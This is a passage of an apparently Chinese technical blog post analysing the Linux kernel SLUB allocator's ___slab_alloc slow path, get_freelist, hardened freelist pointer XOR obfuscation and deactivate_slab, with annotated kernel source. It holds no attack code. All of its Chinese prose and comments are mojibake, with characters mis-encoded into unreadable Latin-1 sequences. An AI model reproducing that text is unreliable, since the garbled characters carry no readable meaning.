class="hljs-comment"> * æ…¢é€Ÿè·¯å¾„. æ— é” freelist ä¸ºç©ºæˆ–æ˜¯æˆ‘ä»¬éœ€è¦è¿›è¡Œè°ƒè¯•ä»»åŠ¡.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥æ–°çš„å¯¹è±¡å·²ç»è¢«é‡Šæ”¾åˆ°å¸¸è§„çš„ freelist ä¸Šï¼Œåˆ™è¿‡ç¨‹ä»æ˜¯å¾ˆå¿«çš„.</span><br><span class="hljs-comment"> * è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ç®€å•åœ°è®©å¸¸è§„çš„ freelist å–ä»£æ— é” freelist</span><br><span class="hljs-comment"> * å¹¶ zap the regular freelist.ï¼ˆzapæƒ³ä¸å‡ºå’‹ç¿»è¯‘å¥½ğŸ˜„ï¼‰</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¿™ä¸èµ·ä½œç”¨ï¼Œåˆ™æˆ‘ä»¬å›é€€åˆ° partial é“¾è¡¨. æˆ‘ä»¬å°† freelist ä¸Šçš„ç¬¬ä¸€ä¸ªå…ƒç´ </span><br><span class="hljs-comment"> * ä½œä¸ºè¦åˆ†é…çš„å¯¹è±¡å¹¶å°† freelist çš„å‰©ä½™éƒ¨åˆ†ç§»åŠ¨åˆ°æ— é” freelist.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬æ— æ³•ä» partial slab é“¾è¡¨ä¸Šè·å¾—ä¸€ä¸ªæ–°çš„ slabï¼Œæˆ‘ä»¬éœ€è¦åˆ†é…ä¸€ä¸ªæ–°çš„ slab.</span><br><span class="hljs-comment"> * å› ä¸ºè¿™åŒ…å«å¯¹é¡µåˆ†é…å™¨çš„è°ƒç”¨ä¸æ–° slab çš„è®¾ç½®ï¼Œè¿™æ˜¯æœ€æ…¢çš„è·¯å¾„.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“æˆ‘ä»¬çŸ¥é“æŠ¢å è¢«ç¦ç”¨æ—¶æ‰€ç”¨çš„ __slab_alloc çš„ç‰ˆæœ¬ (ä¹Ÿæ˜¯é€ æˆå¤§é‡åˆ†é…çš„åŸå› ).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¬”è€…æŒ‰ç…§ä»£ç æ ‡ç­¾é¡ºåºè¿›è¡Œåˆ†æ</p><h4 id="â‘ -reread-slabï¼šè¯»å–-percpu-slab"><a href="#â‘ -reread-slabï¼šè¯»å–-percpu-slab" class="headerlink" title="â‘  reread_slabï¼šè¯»å– percpu slab"></a>â‘  reread_slabï¼šè¯»å– percpu slab</h4><p>é¦–å…ˆè¯»å– percpu çš„ slabï¼Œè‹¥æ²¡æœ‰ slab åˆ™åˆ¤æ–­åˆ†é…èŠ‚ç‚¹ï¼Œå¹¶è·³è½¬åˆ° <code>new_slab</code> åˆ†é…æ–°çš„ slabï¼Œæ³¨æ„è¿™ä¸€å—ä»£ç å¯¹åº” <code>reread_slab</code> æ ‡ç­¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab);<br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ node æœªä¸Šçº¿æˆ–æ²¡æœ‰ normal memoryï¼Œå¿½ç•¥ node çº¦æŸ</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘¡-redoï¼šè·å–-percpu-slab-gt-freelist"><a href="#â‘¡-redoï¼šè·å–-percpu-slab-gt-freelist" class="headerlink" title="â‘¡ redoï¼šè·å– percpu slab-&gt;freelist"></a>â‘¡ redoï¼šè·å– percpu slab-&gt;freelist</h4><p>æ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>redo</code> æ ‡ç­¾ï¼š</p><ul><li><p>è‹¥ percpu slab ä¸ä¸ºç©ºï¼Œåˆ¤æ–­ slab æ˜¯å¦å±äºæŒ‡å®šçš„èŠ‚ç‚¹ä¸”ä¸åˆ†é…æ ‡å¿—ä½åŒ¹é…ï¼Œè‹¥å¦ï¼Œåˆ™è·³è½¬åˆ° <code>deactivate_slab</code> æ ‡ç­¾</p></li><li><p>æ¥ä¸‹æ¥æ£€æŸ¥ slab æ˜¯å¦ä»ä¸ºåŸæ¥çš„ cpu slabï¼ˆå› ä¸ºæˆ‘ä»¬å¯èƒ½è¢«æŠ¢å ï¼‰ï¼Œè‹¥å¦ï¼Œåˆ™è·³è½¬å› <code>reread_slab</code></p></li><li><p>æ¥ä¸‹æ¥è·å– per-cpu çš„ freelistï¼Œè‹¥ä¸ä¸ºç©ºï¼Œåˆ™è·³è½¬åˆ° <code>load_freelist</code>ï¼Œå¦åˆ™<strong>è°ƒç”¨ <code>get_freelist()</code> è·å– slab çš„ freelist</strong></p></li><li><p>è‹¥ slab çš„ freelist ä»ä¸ºç©ºï¼Œå°† per-cpu freelist è®¾ä¸º NULLï¼Œè·å–ä¸‹ä¸€ä¸ª tidï¼Œå¹¶è·³è½¬åˆ° <code>new_slab</code> åˆ†é…æ–°çš„ slab</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ä¸Šé¢ç›¸åŒä½† node_match() ä¸º false åˆ™æ—©å·²è¯´æ˜ node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123;<br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬ç†åº”æœç´¢ä¸€ä¸ª PFMEMALLOC çš„ slab é¡µé¢ï¼Œä½†ç°åœ¨ï¼Œ</span><br><span class="hljs-comment"> * å½“é¡µé¢ç¦»å¼€ per-cpu åˆ†é…å™¨ï¼Œæˆ‘ä»¬æ­£åœ¨å¤±å» pfmemalloc ä¿¡æ¯</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* å¿…é¡»å†æ¬¡æ£€æŸ¥ c-&gt;slab ä»¥å…æˆ‘ä»¬è¢«æŠ¢å ä½¿å…¶å‘ç”Ÿäº†æ›´æ”¹ */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!freelist) &#123;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br><br>stat(s, ALLOC_REFILL);<br></code></pre></td></tr></table></figure><p><code>get_freelist()</code> å‡½æ•°ä¸»è¦å°±æ˜¯è·å– <code>slab-&gt;freelist</code> åå°† <code>slab-&gt;freelist</code> è®¾ä¸º NULL å¹¶è¿”å›åŸæ¥çš„ freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ£€æŸ¥ slab-&gt;freelist å¹¶å°† freelist ä¼ é€ç»™ percpu freelist</span><br><span class="hljs-comment"> * æˆ–æ˜¯å°† slab ç»™ deactivate.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¿”å›å€¼é NULL åˆ™ slab ä»è¢«å†»ç»“.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¯¥å‡½æ•°è¿”å› NULL åˆ™ slab è¢«è§£å†».</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="â‘¢-load-freelistï¼šä»-freelist-åˆ†é…å¯¹è±¡"><a href="#â‘¢-load-freelistï¼šä»-freelist-åˆ†é…å¯¹è±¡" class="headerlink" title="â‘¢ load_freelistï¼šä» freelist åˆ†é…å¯¹è±¡"></a>â‘¢ load_freelistï¼šä» freelist åˆ†é…å¯¹è±¡</h4><p>ç»§ç»­è¿”å› <code>___slab_alloc()</code> ä¸­ï¼Œæ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>load_freelist</code> æ ‡ç­¾ï¼Œä¸»è¦å°±æ˜¯è°ƒç”¨ <code>get_freepointer()</code> å°† percpu freelist æŒ‡å‘ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡ï¼Œå¹¶è·å–ä¸‹ä¸€ä¸ª tid åè¿”å›å‰é¢è·å–çš„ freelistï¼ˆä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist æŒ‡å‘è¦è¢«ä½¿ç”¨çš„å¯¹è±¡é“¾è¡¨. slab æŒ‡å‘è·å¾—å¯¹è±¡çš„ slab.</span><br><span class="hljs-comment"> * å› æ­¤ slab å¿…é¡»è¢«å†»ç»“ä»¥è®© percpu çš„åˆ†é…æ­£å¸¸å·¥ä½œ.</span><br><span class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist);<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åœ¨ <code>get_freepointer()</code> é‡Œå¥—äº†ä¸¤å±‚ï¼Œæœ€åä¼šè°ƒç”¨åˆ° <code>freelist_ptr()</code> è·å–åˆ°ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å½“å¼€å¯äº† Hardened freelist ä¿æŠ¤ååœ¨ next æŒ‡é’ˆçš„ä½ç½®å­˜æ”¾çš„æ˜¯ <strong>ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡åœ°å€ ^ ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡åœ°å€ ^ ä¸€ä¸ªéšæœºå€¼</strong>ï¼ˆ<code>kmem_cache-&gt;random</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¿”å› freelist æŒ‡é’ˆ (ptr). åœ¨æœ‰åŠ å›ºçš„æƒ…å†µä¸‹å…¶é€šè¿‡ä¸€ä¸ª</span><br><span class="hljs-comment"> * å¯¹å­˜å‚¨æŒ‡é’ˆçš„åœ°å€ä¸ per-cache éšæœºå€¼çš„å¼‚æˆ–è¿›è¡Œæ··æ·†.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“å¼€å¯äº† CONFIG_KASAN_SW/HW_TAGS, ptr_addr å¯èƒ½è¢«æ‰“ä¸Šæ ‡ç­¾.</span><br><span class="hljs-comment"> * é€šå¸¸è¿™ä¸ä¼šé€ æˆä»»ä½•é—®é¢˜ï¼Œå› ä¸º set_freepointer() ä¸ get_freepointer() </span><br><span class="hljs-comment"> * è°ƒç”¨æ—¶éƒ½ä¼šæœ‰æ ‡ç­¾ç›¸åŒçš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> * ä½†æ˜¯ CONFIG_SLUB_DEBUG çš„ä»£ç æœ‰äº›é—®é¢˜. ä¾‹å¦‚å½“ __free_slub() åœ¨</span><br><span class="hljs-comment"> * ä¸€ä¸ª cache ä¸­è¿­ä»£å¯¹è±¡æ—¶,å…¶å°†æ²¡æœ‰æ ‡ç­¾çš„æŒ‡é’ˆä¼ ç»™ check_object(). </span><br><span class="hljs-comment"> * check_object() ä¾æ¬¡å¸¦ç€ä¸€ä¸ªæ²¡æœ‰æ ‡ç­¾çš„æŒ‡é’ˆè°ƒç”¨ get_freepointer()ï¼Œ</span><br><span class="hljs-comment"> * ä»è€Œé€ æˆ freepointer å­˜å‚¨é”™è¯¯.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>swab((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º <strong>slab-&gt;freelist æ˜¯æ²¡æœ‰åŠ å¯†çš„ï¼Œä½†é“¾è¡¨ä¸Šçš„åç»­æŒ‡é’ˆéƒ½æ˜¯åŠ å¯†äº†çš„</strong></p><h4 id="â‘£-deactivate-slabï¼šdeactivate-percpu-slab"><a href="#â‘£-deactivate-slabï¼šdeactivate-percpu-slab" class="headerlink" title="â‘£ deactivate_slabï¼šdeactivate percpu slab"></a>â‘£ deactivate_slabï¼šdeactivate percpu slab</h4><p>ç»§ç»­è¿”å› <code>___slab_alloc()</code> ä¸­ï¼Œæ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>deactivate_slab</code> æ ‡ç­¾ï¼Œé¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹åœ°æ£€æŸ¥æ˜¯å¦è¢«æŠ¢å è°ƒåº¦åˆ°äº†åˆ«çš„ CPUï¼Œè‹¥æ˜¯åˆ™è·³è½¬å› <code>reread_slab</code>ï¼›ä¹‹åå°±æ˜¯ç®€å•åœ°å°† percpu çš„ slab å’Œ freelist è®¾ä¸º NULL å¹¶è·å–ä¸‹ä¸€ä¸ª tidï¼Œä¹‹åè°ƒç”¨ <code>deactivate_slab()</code> å°†è¿™å¼  slab ç»™ deactivate äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist);<br></code></pre></td></tr></table></figure><p><code>deactivate_slab()</code> çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>éå† freelist æ£€æŸ¥æ˜¯å¦è¢«ç ´åï¼Œæ”¾å¼ƒè¢«ç ´åçš„éƒ¨åˆ†</li><li>å°† <code>slab-&gt;freelist</code> è®¾ä¸ºåŸ <code>kmem_cache_cpu-&gt;freelist</code>ï¼Œè‹¥ slab ä¸ŠåŸæœ‰ freelist ä¸ä¸º NULL åˆ™å†æ¥åˆ°åé¢</li><li>è®¾ç½® slab çš„ countersï¼Œå…¶ä¸­<strong>å°† <code>frozen</code> è®¾ä¸º 0</strong></li><li>è‹¥ slab ä¸Šçš„å¯¹è±¡å…¨éƒ¨ç©ºé—²**ä¸” node çš„ partial slab æ•°é‡å¤§äº <code>kmem_cache-&gt;min_partial</code>**ï¼Œè°ƒç”¨ <code>discard_slab()</code> å°† slab é‡Šæ”¾</li><li>è‹¥ slab ä¸Šå­˜åœ¨ç©ºé—²å¯¹è±¡ï¼Œè°ƒç”¨ <code>add_partial()</code> å°†å…¶åŠ å…¥ node çš„ partial é“¾è¡¨</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç»“æŸç§»é™¤ cpu slab. åˆå¹¶ cpu&#x27;s freelist ä¸ slab&#x27;s freelist,</span><br><span class="hljs-comment"> * è§£å†» slabs å¹¶æ”¾åœ¨åˆé€‚çš„é“¾è¡¨ä¸Š.</span><br><span class="hljs-comment"> * å‡è®¾ slab å·²ç»è¢«è°ƒç”¨è€…å®‰å…¨åœ°ä» kmem_cache_cpu ä¸Šå–ä¸‹.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é˜¶æ®µä¸€: ç»Ÿè®¡ cpu&#x27;s freelist ä¸Šçš„å¯¹è±¡æ•°é‡ï¼ˆfree_deltaï¼‰ </span><br><span class="hljs-comment"> * å¹¶ä¿å­˜æœ€åä¸€ä¸ªå¯¹è±¡ï¼ˆfreelist_tailï¼‰ ç”¨äºåé¢çš„æ‹¼æ¥.</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ &#x27;nextfree&#x27; æ— æ•ˆ, åœ¨ &#x27;freelist_iter&#x27; ä¸Šçš„å¯¹è±¡å¯èƒ½å·²è¢«ç ´å.</span><br><span class="hljs-comment"> * æ•…é€šè¿‡ç•¥è¿‡ &#x27;freelist_iter&#x27; èµ·çš„æ‰€æœ‰å¯¹è±¡æ¥è¿›è¡Œéš”ç¦».</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é˜¶æ®µäºŒ: è§£å†»slabå¹¶å°†per-cpu freelistæ‹¼æ¥åˆ°slab&#x27;s freelistå¤´éƒ¨.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç¡®ä¿é“¾è¡¨çš„å­˜åœ¨åæ˜ äº†åœ¨è§£å†»æœŸé—´å®é™…çš„å¯¹è±¡æ•°é‡æ—¶ï¼Œslab å·²è¢«è§£å†».</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬é¦–å…ˆåœ¨æŒæœ‰é”çš„æƒ…å†µä¸‹è¿›è¡Œcompxchgå¹¶å½“å…¶æˆåŠŸæ—¶å°† slab æ’å…¥é“¾è¡¨.</span><br><span class="hljs-comment"> * è‹¥æœ‰ä¸åŒ¹é…çš„æƒ…å†µåˆ™ slab ä¸ºæœªå†»ç»“ä¸” 